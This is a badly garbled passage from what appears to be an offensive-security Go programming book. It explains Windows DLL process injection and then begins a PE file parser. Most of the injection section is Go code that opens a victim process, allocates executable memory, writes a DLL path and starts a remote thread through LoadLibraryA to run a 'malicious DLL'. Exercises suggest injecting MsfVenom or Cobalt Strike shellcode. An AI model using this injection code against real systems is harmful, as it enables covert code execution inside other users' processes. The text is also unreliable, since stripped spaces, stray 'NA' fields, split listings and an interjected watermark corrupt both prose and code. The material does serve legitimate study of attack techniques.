 ProcGetLastError=ModKernel32.NewProc(""GetLastError"")
  
 ProcWriteProcessMemory=ModKernel32.NewProc(""WriteProcessMemory"")
 ❷ProcOpenProcess=ModKernel32.NewProc(""OpenProcess"") 
  
 ProcGetCurrentProcess=ModKernel32.NewProc(""GetCurrentProcess"")
  
 ProcIsDebuggerPresent=ModKernel32.NewProc(""IsDebuggerPresent"") 
 ProcGetProcAddress=ModKernel32.NewProc(""GetProcAddress"") 
 ProcCloseHandle=ModKernel32.NewProc(""CloseHandle"") 
  
 ProcGetExitCodeThread=ModKernel32.NewProc(""GetExitCodeThread"")
  
 )
  
 Listing12-3:The
 winmods
 file(
 /ch-12/procInjector/winsys/winmods.go
 )",NA
Weusethe,NewLazyDLL(),NA
methodtoloadthe,Kernel32,NA
DLL,NA,NA
❶.,Kernel32,NA
managesmuchoftheinternalWindowsprocess ,NA,NA
"functionality,suchasaddressing,handling,memory ",NA,NA
"allocation,andmore.(It’sworthnotingthat,asofGoversion ",NA,NA
"1.12.2,youcanuseacoupleofnewfunctionstobetterload ",NA,NA
DLLsandpreventsystemDLLhijackingattacks:,LoadLibraryEx(),NA
and,NewLazySystemDLL(),NA
.),NA,NA
"BeforewecaninteractwiththeDLL,wemustestablisha ",NA,NA
variablethatwecanuseinourcode.Wedothisbycalling ,module.NewProc,NA
"foreachAPIthatwe’llneedtouse.At❷,we ",NA,NA
callitagainst,OpenProcess(),NA
andassignittoanexportedvariable,NA,NA
called,ProcOpenProcess,NA
.Theuseof,OpenProcess(),NA
isarbitrary;it’s,NA,NA
intendedtodemonstratethetechniqueforassigningany ,NA,NA
exportedWindowsDLLfunctiontoadescriptivevariable ,NA,NA
name.,NA,NA
ObtainingaProcessTokenwiththeOpenProcess ,NA,NA
WindowsAPI,NA,NA
"Next,webuildoutthe",OpenProcessHandle(),NA
"function,whichwe’ll",NA,NA
usetoobtainaprocesshandletoken.Wewilllikelyusethe ,NA,NA
terms,NA,NA
token,NA,NA
and,NA,NA
handle,NA,NA
"interchangeablythroughoutthecode, ",NA,NA
butrealizethateveryprocesswithinaWindowssystemhasa ,NA,NA
uniqueprocesstoken.Thisprovidesameanstoenforce ,NA,NA
"relevantsecuritymodels,suchas",NA,NA
MandatoryIntegrityControl,NA,NA
", ",NA,NA
acomplexsecuritymodel(andonethatisworthinvestigating ,NA,NA
inordertogetmoreacquaintedwithprocess-,NA,NA
levelmechanics).,NA,NA
Thesecuritymodelsconsistofsuchitemsasprocess-level ,NA,NA
"rightsandprivileges,forexample,anddictatehowboth ",NA,NA
unprivilegedandelevatedprocessescaninteractwithone ,NA,NA
another.,NA,NA
"First,let’stakealookattheC++",OpenProcess(),NA
datastructure,NA,NA
asdefinedwithintheWindowAPIdocumentation(,NA,NA
Listing12-,NA,NA
4,NA,NA
).We’lldefinethisobjectasifweintendedtocallitfrom ,NA,NA
"nativeWindowsC++code.However,wewon’tbedoingthis, ",NA,NA
becausewe’llbedefiningthisobjecttobeusedwithGo’s ,syscall,NA
"package.Therefore,we’llneedtotranslatethisobjectto",NA,NA
standardGodatatypes.,"HANDLEOpenProcess( 
  
 DWORD❶dwDesiredAccess, 
  
 BOOLbInheritHandle,
  
  
 DWORDdwProcessId
  
  
 );
  
 Listing12-4:AnarbitraryWindowsC++objectanddatatypes",NA
Thefirstnecessarytaskistotranslate,DWORD,NA
❶toausable ,NA,NA
typethatGomaintains.A,DWORD,NA
isdefinedbyMicrosoftasa,NA,NA
"32-bitunsignedinteger,whichcorrespondstoGo’s",uint32,NA
type.,NA,NA
The,DWORD,NA
valuestatesthatitmustcontain,dwDesiredAccess,NA
"or,",NA,NA
"asthedocumentationstates,“oneormoreoftheprocess ",NA,NA
accessrights.”Processaccessrightsdefinetheactionswe ,NA,NA
"wishtotakeuponaprocess,givenavalidprocesstoken.",NA,NA
Wewanttodeclareavarietyofprocessaccessrights.Since ,NA,NA
"thesevalueswon’tchange,weplacesuchrelevantvaluesina ",NA,NA
"Goconstantsfile,asshownin",NA,NA
Listing12-5,NA,NA
.Eachlineinthis ,NA,NA
listdefinesaprocessaccessright.Thelistcontainsalmost ,NA,NA
"everyavailableprocessaccessright,butwewilluseonlythe ",NA,NA
onesnecessaryforobtainingaprocesshandle.,"const(
  
  
 //
  
 docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights
  
 PROCESS_CREATE_PROCESS=0x0080",NA
Alltheprocessaccessrightswedefinedin,NA,NA
Listing12-5 ,NA,NA
"reconcilewiththeirrespectiveconstanthexadecimalvalues, ",NA,NA
whichistheformattheyneedtobeintoassignthemtoaGo ,NA,NA
variable.,NA,NA
Oneissuethatwe’dliketodescribepriortoreviewing ,NA,NA
Listing12-6,NA,NA
isthatmostofthefollowingprocessinjection ,NA,NA
"functions,notjust",OpenProcessHandle(),NA
",willconsumeacustom",NA,NA
objectoftype,Inject,NA
andreturnavalueoftype,error,NA
.The,Inject,NA
structobject(,NA,NA
Listing12-6,NA,NA
)willcontainvariousvaluesthat ,NA,NA
willbeprovidedtotherelevantWindowsfunctionvia,syscall,NA
.,"typeInjectstruct{
  
  
 Piduint32
  
  
 DllPathstring
  
  
 DLLSizeuint32
  
  
 Privilegestring
  
  
 RemoteProcHandleuintptr
  
  
 Lpaddruintptr
  
  
 LoadLibAddruintptr
  
 RThreaduintptr
  
 TokenTOKEN",NA
Listing12-7,NA,NA
"illustratesourfirstactualfunction,",OpenProcessHandle(),NA
.Let’stakealookatthefollowingcodeblock,NA,NA
anddiscussthevariousdetails.,"funcOpenProcessHandle(i*Inject)error{
  
  
 ❶varrightsuint32=PROCESS_CREATE_THREAD| 
 PROCESS_QUERY_INFORMATION|
  
 PROCESS_VM_OPERATION| 
  
 PROCESS_VM_WRITE|
  
 PROCESS_VM_READ
  
 ❷varinheritHandleuint32=0
  
 ❸varprocessIDuint32=i.Pid
  
 ❹remoteProcHandle,_,lastErr❺:=ProcOpenProcess.Call❻
 (
  
 uintptr(rights),//DWORDdwDesiredAccess
  
 uintptr(inheritHandle),//BOOLbInheritHandle 
  
 uintptr(processID))//DWORDdwProcessId 
  
 ifremoteProcHandle==0{ 
  
 returnerrors.Wrap(lastErr,`[!]ERROR: 
  
 Can'tOpenRemoteProcess.Mayberunningwelevatedintegrity?`) } 
  
 i.RemoteProcHandle=remoteProcHandle 
  
 fmt.Printf(""[-]InputPID:%v\n"",i.Pid) 
  
 fmt.Printf(""[-]InputDLL:%v\n"",i.DllPath) 
  
 fmt.Printf(""[+]Processhandle:%v\n"",unsafe.Pointer(i.RemoteProcHandle)) 
 returnnil
  
 }
  
 Listing12-7:The
 OpenProcessHandle()
 functionusedtoobtainaprocesshandle
 (
 /ch-
 12/procInjector/winsys/inject.go
 )",NA
Thecodestartsbyassigningprocessaccessrightstothe ,uint32,NA
variablecalled,rights,NA
❶.Theactualvaluesassigned ,NA,NA
include,PROCESS_CREATE_THREAD,NA
",whichallowsustocreatea",NA,NA
threadonourremoteprocess.Followingthatis ,PROCESS_QUERY_INFORMAITON,NA
",whichgivesustheabilityto",NA,NA
genericallyquerydetailsabouttheremoteprocess.Thelast ,NA,NA
"threeprocessaccessrights,",PROCESS_VM_OPERATION,NA
",",PROCESS_VM_WRITE,NA
",and",PROCESS_VM_READ,NA
",allprovidethe",NA,NA
accessrightstomanagetheremoteprocessvirtualmemory. ,NA,NA
"Thenextdeclaredvariable,",inheritHandle,NA
"❷,dictateswhethe",NA,NA
r ournewprocesshandlewillinherittheexistinghandle.We ,NA,NA
passin,0,NA
"toindicateaBooleanfalsevalue,aswewantanew ",NA,NA
processhandle.Immediatelyfollowingisthe,processID,NA
❸varia,NA,NA
blecontainingthePIDofthevictimprocess.Allthe ,NA,NA
"while,wereconcileourvariabletypeswiththeWindowsAPI ",NA,NA
"documentation,suchthatbothourdeclaredvariablesareof ",NA,NA
type,uint32,NA
.Thispatterncontinuesuntilwemakethesystem ,NA,NA
callbyusing,ProcOpenProcess.Call(),NA
❻,.,NA
The,.Call(),NA
methodconsumesavaryingnumberof,uintptr,NA
"values,which,ifweweretolookatthe",Call(),NA
function,NA,NA
"signature,wouldbedeclaredliterallyas",...uintptr,NA
".Additionally, ",NA,NA
thereturntypesaredesignatedas,uintptr,NA
❹and,error,NA
"❺.Further, ",NA,NA
theerrortypeisnamed,lastErr,NA
"❺,whichyou’llfindreferenced ",NA,NA
"intheWindowsAPIdocumentation,andcontainsthereturned ",NA,NA
errorvalueasdefinedbytheactualcalledfunction.,NA,NA
ManipulatingMemorywiththeVirtualAllocEx ,NA,NA
WindowsAPI,NA,NA
"Nowthatwehavearemoteprocesshandle,weneedameans",NA,NA
toallocatevirtualmemorywithintheremoteprocess.Thisis,NA,NA
necessaryinordertosetasidearegionofmemoryand ,NA,NA
initializeitpriortowritingtoit.Let’sbuildthatoutnow.,NA,NA
Placethefunctiondefinedin,NA,NA
Listing12-8,NA,NA
immediatelyafter ,NA,NA
thefunctiondefinedin,NA,NA
Listing12-7,NA,NA
.(Wewillcontinueto ,NA,NA
"appendfunctions,oneafteranother,aswenavigatetheprocess",NA,NA
injectioncode.),"funcVirtualAllocEx(i*Inject)error{
  
 varflAllocationTypeuint32=MEM_COMMIT|MEM_RESERVE 
 varflProtectuint32=PAGE_EXECUTE_READWRITE 
  
 lpBaseAddress,_,lastErr:=ProcVirtualAllocEx.Call(
  
 i.RemoteProcHandle,//HANDLEhProcess 
 uintptr(nullRef),//LPVOIDlpAddress❶uintptr
 (i.DLLSize),//SIZE_TdwSize
  
 uintptr(flAllocationType),//DWORDflAllocationType 
  
 // 
  
 https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-
 constants
  
 uintptr(flProtect))//DWORDflProtect
  
 iflpBaseAddress==0{ 
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Can'tAllocateMemoryOnRemote 
 Process."") 
  
 } 
  
 i.Lpaddr=lpBaseAddress 
  
 fmt.Printf(""[+]Basememoryaddress:%v\n"",unsafe.Pointer(i.Lpaddr)) 
  
 returnnil
  
 }
  
 Listing12-8:Allocatingaregionofmemoryintheremoteprocessvia
 VirtualAllocEx 
 (
 /ch-
 12/procInjector/winsys/inject.go
 )",NA
Unliketheprevious,OpenProcess(),NA
"systemcall,weintroducea ",NA,NA
newdetailviathe,nullRef,NA
variable❶.The,nil,NA
keywordis ,NA,NA
reservedbyGoforall,null,NA
"intents.However,it’satypedvalue,",NA,NA
whichmeansthatpassingitdirectlyviaa,syscall,NA
withoutatype,NA,NA
willresultineitheraruntimeerrororatype-conversionerror,NA,NA
"—eitherway,abadsituation.Thefixissimpleinthiscase:we ",NA,NA
declareavariablethatresolvestoa,0,NA
"value,suchasaninteger.",NA,NA
The,0,NA
valuecannowbereliablypassedandinterpretedasa,null,NA
valuebythereceivingWindowsfunction.,NA,NA
WritingtoMemorywiththeWriteProcessMemor,NA,NA
y WindowsAPI,NA,NA
"Next,we’llusethe",WriteProcessMemory(),NA
functiontowritetothe,NA,NA
remoteprocess’smemoryregionpreviouslyinitializedusing ,NA,NA
the,VirtualAllocEx(),NA
function.In,NA,NA
Listing12-9,NA,NA
",we’llkeepthings",NA,NA
"simplebycallingaDLLbyfilepath,ratherthanwritingthe ",NA,NA
entireDLLcodeintomemory.,"funcWriteProcessMemory(i*Inject)error{
  
  
 varnBytesWritten*byte 
  
 dllPathBytes,err:=syscall.BytePtrFromString(i.DllPath)❶ife
 rr!=nil{
  
 returnerr 
  
 } 
  
 writeMem,_,lastErr:=ProcWriteProcessMemory.Call( 
 i.RemoteProcHandle,//HANDLEhProcess
  
 i.Lpaddr,//LPVOIDlpBaseAddress 
  
 uintptr(unsafe.Pointer(dllPathBytes)),//LPCVOIDlpBuffer❷uint
 ptr(i.DLLSize),//SIZE_TnSize
  
 uintptr(unsafe.Pointer(nBytesWritten)))//SIZE_T 
  
 *lpNumberOfBytesWritten 
  
 ifwriteMem==0{ 
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Can'twritetoprocessmemory."") } 
  
 returnnil
  
 }
  
 Listing12-9:WritingtheDLLfilepathtoremoteprocessmemory(
 /ch-
 12/procInjector/winsys/inject.go
 )",NA
Thefirstnoticeable,syscall,NA
functionis,BytePtrFromString(),NA
"❶, ",NA,NA
whichisaconveniencefunctionthatconsumesa,string,NA
and,NA,NA
returnsthebaseindex-0pointerlocationofa,byte,NA
"slice,which",NA,NA
we’llassignto,dllPathBytes,NA
.,NA,NA
"Finally,wegettosee",unsafe.Pointer,NA
inaction.Thethird,NA,NA
argumenttothe,ProcWriteProcessMemory.Call,NA
isdefinedwithinthe,NA,NA
WindowsAPIspecificationas“,lpBuffer,NA
—apointertothebuffer,NA,NA
thatcontainsdatatobewrittenintheaddressspaceofthe ,NA,NA
specifiedprocess.”InordertopasstheGopointervalue ,NA,NA
definedin,dllPathBytes,NA
"overtothereceivingWindowsfunction,",NA,NA
weuse,unsafe.Pointer,NA
tocircumventtypeconversions.Onefinal ,NA,NA
pointtomakehereisthat,uintptr,NA
and,unsafe.Pointer,NA
❷are ,NA,NA
"acceptablysafe,sincebotharebeingusedinlineandwithout ",NA,NA
theintentofassigningthereturnvaluetoavariableforlater ,NA,NA
reuse.,NA,NA
FindingLoadLibraryAwiththeGetProcessAddres,NA,NA
s WindowsAPI,NA,NA
Kernel32.dll,NA,NA
exportsafunctioncalled,LoadLibraryA(),NA
",whichis",NA,NA
availableonallWindowsversions.Microsoftdocumentation ,NA,NA
statesthat,LoadLibraryA(),NA
“loadsthespecifiedmoduleintothe,NA,NA
addressspaceofthecallingprocess.Thespecifiedmodule ,NA,NA
maycauseothermodulestobeloaded.”Weneedtoobtainthe ,NA,NA
memorylocationof,LoadLibraryA(),NA
beforecreatingaremote,NA,NA
threadnecessarytoexecuteouractualprocessinjection.We ,NA,NA
candothiswiththe,GetLoadLibAddress(),NA
function—oneofthose,NA,NA
supportingfunctionsmentionedearlier(,NA,NA
Listing12-10,NA,NA
).,"funcGetLoadLibAddress(i*Inject)error{
  
  
 varllibBytePtr*byte 
  
 llibBytePtr,err:=syscall.BytePtrFromString(""LoadLibraryA"")❶",NA
Weusethe,GetProcessAddress(),NA
Windowsfunctiontoidentify,NA,NA
thebasememoryaddressof,LoadLibraryA(),NA
necessarytocallthe ,CreateRemoteThread(),NA
function.The,ProcGetProcAddress.Call(),NA
❷,NA,NA
functiontakestwoarguments:thefirstisahandleto,Kernel32.dll,NA
❸thatcontainstheexportedfunctionwe’reinterestedin ,NA,NA
(,LoadLibraryA(),NA
"),andthesecondisthebaseindex-0pointer ",NA,NA
location❹ofa,byte,NA
slicereturnedfromtheliteralstring ,"""LoadLibraryA""",NA
❶.,NA,NA
ExecutingtheMaliciousDLLUsingthe ,NA,NA
CreateRemoteThreadWindowsAPI,NA,NA
We’llusethe,CreateRemoteThread(),NA
Windowsfunctiontocreatea,NA,NA
threadagainsttheremoteprocess’virtualmemoryregion.If ,NA,NA
thatregionhappenstobe,LoadLibraryA(),NA
",wenowhaveameans",NA,NA
toloadandexecutetheregionofmemorycontainingthefile ,NA,NA
pathtoourmaliciousDLL.Let’sreviewthecodein,NA,NA
Listing,NA,NA
12-11,NA,NA
.,"funcCreateRemoteThread(i*Inject)error{
  
 varthreadIduint32=0
  
 vardwCreationFlagsuint32=0 
  
 remoteThread,_,lastErr:=ProcCreateRemoteThread.Call❶( 
  
 i.RemoteProcHandle,//HANDLEhProcess❷
  
 uintptr(nullRef),//LPSECURITY_ATTRIBUTESlpThreadAttributes
  
  
 uintptr(nullRef),//SIZE_TdwStackSize 
  
 i.LoadLibAddr,//LPTHREAD_START_ROUTINElpStartAddress❸i.Lpadd
 r,//LPVOIDlpParameter❹
  
 uintptr(dwCreationFlags),//DWORDdwCreationFlags
  
 uintptr(unsafe.Pointer(&threadId)),//LPDWORDlpThreadId 
  
 ) 
  
 ifremoteThread==0{ 
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Can'tCreateRemoteThread."") } 
  
 i.RThread=remoteThread 
  
 fmt.Printf(""[+]Threadidentifiercreated:%v\n"",unsafe.Pointer(&threadId)) 
 fmt.Printf(""[+]Threadhandlecreated:%v\n"",unsafe.Pointer(i.RThread)) 
 returnnil
  
 }
  
 Listing12-11:Executingtheprocessinjectionbyusingthe
 CreateRemoteThread() 
 Windowsfunction(
 /ch-12/procInjector/winsys/inject.go
 )",NA
The,ProcCreateRemoteThread.Call(),NA
❶functiontakesatotalof ,NA,NA
"sevenarguments,althoughwe’lluseonlythreeoftheminthis ",NA,NA
example.Therelevantargumentsare,RemoteProcHandle,NA
❷,NA,NA
"containingthevictimprocess’shandle,",LoadLibAddr,NA
❸,NA,NA
containingthestartroutinetobecalledbythethread(inthis ,NA,NA
"case,",LoadLibraryA(),NA
"),and,lastly,thepointer❹tothevirtually ",NA,NA
allocatedmemoryholdingthepayloadlocation.,NA,NA
VerifyingInjectionwiththeWaitforSingleObjec,NA,NA
t WindowsAPI,NA,NA
We’llusethe,WaitforSingleObject(),NA
Windowsfunctiontoidentify,NA,NA
whenaparticularobjectisinasignaledstate.Thisisrelevant,NA,NA
toprocessinjectionbecausewewanttowaitforourthreadto,NA,NA
executeinordertoavoidbailingoutprematurely.Let’sbriefly,NA,NA
discussthefunctiondefinitionin,NA,NA
Listing12-12,NA,NA
.,"funcWaitForSingleObject(i*Inject)error{
  
 vardwMillisecondsuint32=INFINITE
  
 vardwExitCodeuint32 
  
 rWaitValue,_,lastErr:=ProcWaitForSingleObject.Call(❶i.RT
 hread,//HANDLEhHandle
  
 uintptr(dwMilliseconds))//DWORDdwMilliseconds
  
 ifrWaitValue!=0{
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Errorreturningthreadwaitstate."")
  
 } 
  
 success,_,lastErr:=ProcGetExitCodeThread.Call(❷i.R
 Thread,//HANDLEhThread
  
 uintptr(unsafe.Pointer(&dwExitCode)))//LPDWORDlpExitCode
  
 ifsuccess==0{
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Errorreturningthreadexitcode."")
  
 } 
  
 closed,_,lastErr:=ProcCloseHandle.Call(i.RThread)//HANDLEhObject❸ifclos
 ed==0{
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Errorclosingthreadhandle."")
  
 }
  
 returnnil
  
 }
  
 Listing12-12:Usingthe
 WaitforSingleObject()
 Windowsfunctiontoensuresuccessful
  
 threadexecution(
 /ch-12/procInjector/winsys/inject.go
 )",NA
"Threenotableeventsareoccurringinthiscodeblock.First, ",NA,NA
the,ProcWaitForSingleObject.Call(),NA
systemcall❶ispassedthethread ,NA,NA
handlereturnedin,NA,NA
Listing12-11,NA,NA
.Awaitvalueof,INFINITE,NA
is,NA,NA
passedasthesecondargumenttodeclareaninfiniteexpiration,NA,NA
timeassociatedwiththeevent.,NA,NA
"Next,",ProcGetExitCodeThread.Call(),NA
❷determineswhetherth,NA,NA
"e threadterminatedsuccessfully.Ifitdid,the",LoadLibraryA,NA
"functionshouldhavebeencalled,andourDLLwillhavebeen ",NA,NA
"executed.Finally,aswedofortheresponsiblecleanupof ",NA,NA
"almostanyhandle,wepassedthe",ProcCloseHandle.Call(),NA
system ,NA,NA
call❸sothatthatthreadobjecthandleclosescleanly.,NA,NA
CleaningUpwiththeVirtualFreeExWindowsAPI,NA,NA
Weusethe,VirtualFreeEx(),NA
"Windowsfunctiontorelease,or",NA,NA
"decommit,thevirtualmemorythatweallocatedin",NA,NA
Listing12-,NA,NA
8,NA,NA
via,VirtualAllocEx(),NA
.Thisisnecessarytocleanupmemory,NA,NA
"responsibly,sinceinitializedmemoryregionscanberather ",NA,NA
"large,consideringtheoverallsizeofthecodebeinginjected ",NA,NA
"intotheremoteprocess,suchasanentireDLL.Let’stakea ",NA,NA
lookatthisblockofcode(,NA,NA
Listing12-13,NA,NA
).,"funcVirtualFreeEx(i*Inject)error{
  
 vardwFreeTypeuint32=MEM_RELEASE
  
 varsizeuint32=0//Sizemustbe0toMEM_RELEASEalloftheregion
  
 rFreeValue,_,lastErr:=ProcVirtualFreeEx.Call❶( 
 i.RemoteProcHandle,//HANDLEhProcess❷i.Lpadd
 r,//LPVOIDlpAddress❸
  
 uintptr(size),//SIZE_TdwSize❹
  
 uintptr(dwFreeType))//DWORDdwFreeType❺
  
 ifrFreeValue==0{
  
 returnerrors.Wrap(lastErr,""[!]ERROR:Errorfreeingprocessmemory."") } 
  
 fmt.Println(""[+]Success:Freedmemoryregion"") 
  
 returnnil
  
 }
  
 Listing12-13:Freeingvirtualmemorybyusingthe
 VirtualFreeEx()
 Windowsfunction 
 (
 /ch-12/procInjector/winsys/inject.go
 )",NA
The,ProcVirtualFreeEx.Call(),NA
function❶takesfourarguments. ,NA,NA
Thefirstistheremoteprocesshandle❷associatedwiththe ,NA,NA
processthatistohaveitsmemoryfreed.Thenextargumentis,NA,NA
apointer❸tothelocationofmemorytobefreed.,NA,NA
Noticethatavariablenamed,size,NA
❹isassigneda,0,NA
value.,NA,NA
"Thisisnecessary,asdefinedwithintheWindowsAPI ",NA,NA
"specification,toreleasetheentireregionofmemorybackinto ",NA,NA
"areclaimablestate.Finally,wepassthe",MEM_RELEASE,NA
operation❺tocompletelyfreetheprocessmemory(andour ,NA,NA
discussiononprocessinjection).,NA,NA
AdditionalExercises,NA,NA
"Likemanyoftheotherchaptersinthisbook,thischapterwill",NA,NA
providethemostvalueifyoucodeandexperimentalongthe ,NA,NA
"way.Therefore,weconcludethissectionwithafew ",NA,NA
challengesorpossibilitiestoexpandupontheideasalready ,NA,NA
covered:,"Oneofthemostimportantaspectsofcreatingcodeinjectionismaintaininga 
  
 usabletoolchainsufficientforinspectinganddebuggingprocessexecution. 
  
 DownloadandinstallboththeProcessHackerandProcessMonitortools.Then, 
  
 usingProcessHacker,locatethememoryaddressesofbothKernel32and 
  
 LoadLibrary.Whileyou’reatit,locatetheprocesshandleandtakealookatthe 
  
 integritylevel,alongwithinherentprivileges.Nowinjectyourcodeintothe 
  
 samevictimprocessandlocatethethread.
  
  
 Youcanexpandtheprocessinjectionexampletobelesstrivial.Forexample, 
  
 insteadofloadingthepayloadfromadiskfilepath,useMsfVenomorCobalt 
  
 Striketogenerateshellcodeandloaditdirectlyintoprocessmemory.Thiswill 
  
 requireyoutomodifyVirtualAllocExandLoadLibrary.
  
  
 CreateaDLLandloadtheentirecontentsintomemory.Thisissimilartothe 
  
 previousexercise:theexceptionisthatyou’llbeloadinganentireDLLrather 
  
 thanshellcode.UseProcessMonitortosetapathfilter,processfilter,orboth, 
  
 andobservethesystemDLLloadorder.WhatpreventsDLLloadorder 
  
 hijacking?
  
  
 YoucanuseaprojectcalledFrida(
 https://www.frida.re/
 )toinjecttheGoogle
  
 ChromeV8JavaScriptengineintothevictimprocess.Ithasastrongfollowing 
 withmobilesecuritypractitionersaswellasdevelopers:youcanuseitto 
 performruntimeanalysis,in-processdebugging,andinstrumentation.Youcan",NA
THEPORTABLEEXECUTABLEFILE,NA,NA
Sometimesweneedavehicletodeliverourmaliciouscode. ,NA,NA
Thiscouldbeanewlymintedexecutable(deliveredthroughan ,NA,NA
"exploitinpreexistingcode),oramodifiedexecutablethat ",NA,NA
"alreadyexistsonthesystem,forexample.Ifwewantedto ",NA,NA
"modifyanexistingexecutable,wewouldneedtounderstand ",NA,NA
thestructureoftheWindows,NA,NA
PortableExecutable(PE),NA,NA
file ,NA,NA
"binarydataformat,asitdictateshowtoconstructan ",NA,NA
"executable,alongwiththeexecutable’scapabilities.Inthis ",NA,NA
"section,we’llcoverboththePEdatastructureandGo’sPE ",NA,NA
"package,andbuildaPEbinaryparser,whichyoucanuseto ",NA,NA
navigatethestructureofaPEbinary.,NA,NA
UnderstandingthePEFileFormat,NA,NA
"First,let’sdiscussthePEdatastructureformat.TheWindows ",NA,NA
PEfileformatisadatastructuremostoftenrepresentedasan ,NA,NA
"executable,objectcode,oraDLL.ThePEformatalso ",NA,NA
maintainsreferencesforallresourcesusedduringtheinitial ,NA,NA
"operatingsystemloadingofthePEbinary,includingthe ",NA,NA
exportaddresstable(EAT)usedtomaintainexported ,NA,NA
"functionsbyordinal,theexportnametableusedtomaintain ",NA,NA
"exportedfunctionsbyname,theimportaddresstable(IAT), ",NA,NA
"importnametable,threadlocalstorage,andresource ",NA,NA
"management,amongotherstructures.YoucanfindthePE ",NA,NA
formatspecificationat,NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/win32/debug/pe-format/,NA,NA
.,NA,NA
Figure12-,NA,NA
6,NA,NA
showsthe,NA,NA
PEdatastructure:avisualrepresentationofaWindows ,NA,NA
binary.,Figure12-6:TheWindowsPEfileformat,NA
Wewillexamineeachofthesetop-downsectionsaswe ,NA,NA
buildoutthePEparser.,NA,NA
WritingaPEParser,NA,NA
"Throughoutthefollowingsections,wewillwritethe ",NA,NA
individualparsercomponentsnecessarytoanalyzeeachPE ,NA,NA
"sectionwithintheWindowsbinaryexecutable.Asanexample, ",NA,NA
we’llusethePEformatassociatedwiththeTelegram ,NA,NA
messagingapplicationbinarylocatedat,NA,NA
https://telegram.org,NA,NA
", ",NA,NA
sincethisappisbothlesstrivialthantheoftenoverusedputty ,NA,NA
"SSHbinaryexample,andisdistributedasaPEformat.You ",NA,NA
"canusealmostanyWindowsbinaryexecutable,andwe",HivaNetwork.Com,NA
encourageyoutoinvestigateothers.,NA,NA
LoadingthePEbinaryandFileI/O,NA,NA
In,NA,NA
Listing12-14,NA,NA
",we’llstartbyusingtheGoPEpackageto ",NA,NA
preparetheTelegrambinaryforfurtherparsing.Youcanplace ,NA,NA
allthecodethatwecreatewhenwritingthisparserinasingle ,NA,NA
filewithina,main(),NA
function.,"import(
  
 ❶""debug/pe"" 
  
 ""encoding/binary""
  
 ""fmt"" 
  
 ""io"" 
  
 ""log"" 
  
 ""os""
  
 )
  
  
 funcmain(){
  
 ❷f,err:=os.Open(""Telegram.exe"") 
 check(err)
  
 ❸pefile,err:=pe.NewFile(f) 
  
 check(err)
  
 deferf.Close()
  
 deferpefile.Close()
  
 Listing12-14:FileI/OforPEbinary(
 /ch-12/peParser/main.go
 )",NA
"PriortoreviewingeachofthePEstructurecomponents,we ",NA,NA
needtostubouttheinitialimport❶andfileI/Obyusingthe ,NA,NA
GoPEpackage.Weuse,os.Open(),NA
❷andthen,pe.NewFile(),NA
❸to ,NA,NA
"createafilehandleandaPEfileobject,respectively.Thisis ",NA,NA
necessarybecauseweintendtoparsethePEfilecontentsby ,NA,NA
usinga,Reader,NA
"object,suchasafileorbinaryreader.",NA,NA
ParsingtheDOSHeaderandtheDOSStub,NA,NA
Thefirstsectionofthetop-downPEdatastructureillustrated ,NA,NA
in,NA,NA
Figure12-6,NA,NA
startswithaDOSheader.Thefollowingunique ,NA,NA
valueisalwayspresentwithinanyWindowsDOS-based ,NA,NA
executablebinary:,0x4D0x5A,NA
(or,MZ,NA
"inASCII),whichaptly",NA,NA
declaresthefileasaWindowsexecutable.Anothervalue ,NA,NA
universallypresentonallPEfilesislocatedatoffset,0x3C,NA
.The,NA,NA
valueatthisoffsetpointstoanotheroffsetcontainingthe ,NA,NA
"signatureofaPEfile:aptly,",0x500x450x000x00,NA
(or,PE,NA
inASCII).,NA,NA
"TheheaderthatimmediatelyfollowsistheDOSStub, ",NA,NA
whichalwaysprovidesthehexvaluesfor,"Thisprogramcannotberun
  
 inDOSmode",NA
;theexceptiontothisoccurswhenacompiler’s,/STUB,NA
linkeroptionprovidesanarbitrarystringvalue.Ifyou,NA,NA
takeyourfavoritehexeditorandopentheTelegram ,NA,NA
"application,itshouldbesimilarto",NA,NA
Figure12-7,NA,NA
.Allofthese ,NA,NA
valuesarepresent.,NA,NA
"Sofar,wehavedescribedtheDOSHeaderandStubwhile ",NA,NA
alsolookingatthehexadecimalrepresentationthroughahex ,NA,NA
"editor.Now,let’stakealookatparsingthosesamevalues ",NA,NA
"withGocode,asprovidedin",NA,NA
Listing12-15,NA,NA
.,"dosHeader:=make([]byte,96)
  
  
 sizeOffset:=make([]byte,4)
  
  
 //DectoAscii(searchingforMZ) 
 _,err=f.Read(dosHeader)❶
  
 check(err)
  
 fmt.Println(""[-----DOSHeader/Stub-----]"")
  
 fmt.Printf(""[+]MagicValue:%s%s\n"",string(dosHeader[0]), 
 string(dosHeader[1]))❷",NA
"Startingfromthebeginningofthefile,weuseaGo","file 
 Reader",NA
❶instancetoread96bytesonwardinordertoconfirm ,NA,NA
theinitialbinarysignature❷.Recallthatthefirst2bytes ,NA,NA
providetheASCIIvalue,MZ,NA
.ThePEpackageoffers,NA,NA
convenienceobjectstohelpmarshalPEdatastructuresinto ,NA,NA
"somethingmoreeasilyconsumable.Itwill,however,still ",NA,NA
requiremanualbinaryreadersandbitwisefunctionalitytoge,NA,NA
t ,NA,NA
itthere.Weperformabinaryreadoftheoffsetvalue❸referen,NA,NA
cedat,0x3c,NA
",andthenreadexactly4bytes❹composed ",NA,NA
ofthevalue,0x500x45,NA
(,PE,NA
)followedby2,0x00,NA
bytes.,NA,NA
ParsingtheCOFFFileHeader,NA,NA
"ContinuingdownthePEfilestructure,andimmediately ",NA,NA
"followingtheDOSStub,istheCOFFFileHeader.Let’sparse ",NA,NA
theCOFFFileHeaderbyusingthecodedefinedin,NA,NA
Listing12-,NA,NA
16,NA,NA
",andthendiscusssomeofitsmoreinterestingproperties.",NA,NA
Wecreateanew,SectionReader,NA
❶thatstartsfromthe ,NA,NA
beginningofthefileatposition0andreadstothemaxvalue ,NA,NA
ofan,int64,NA
.Thenthe,sr.Seek(),NA
function❷resetsthepositionto ,NA,NA
"startreadingimmediately,followingthePEsignatureoffset",NA,NA
andvalue(recalltheliteralvalues,PE+0x00+0x00,NA
").Finally,we ",NA,NA
performabinaryread❸tomarshalthebytesintothe,pefile,NA
object’s,FileHeader,NA
